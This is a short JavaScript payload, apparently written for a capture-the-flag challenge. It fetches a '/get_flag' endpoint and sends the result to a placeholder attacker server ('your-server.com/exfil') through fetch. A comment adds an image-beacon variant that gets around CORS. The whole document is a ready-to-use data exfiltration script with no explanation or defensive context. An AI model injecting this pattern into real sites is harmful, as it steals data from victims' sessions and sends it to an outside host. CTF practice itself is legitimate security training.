fetch('/get_flag')
  .then(response => response.text())
  .then(flag => {
    // Exfil to your server (replace with your endpoint)
    fetch('https://your-server.com/exfil?flag=' + encodeURIComponent(flag));
    // Or use img for no-CORS: new Image().src = 'https://your-server.com/exfil?flag=' + encodeURIComponent(flag);
  })
  .catch(error => console.error('Failed to fetch flag:', error));
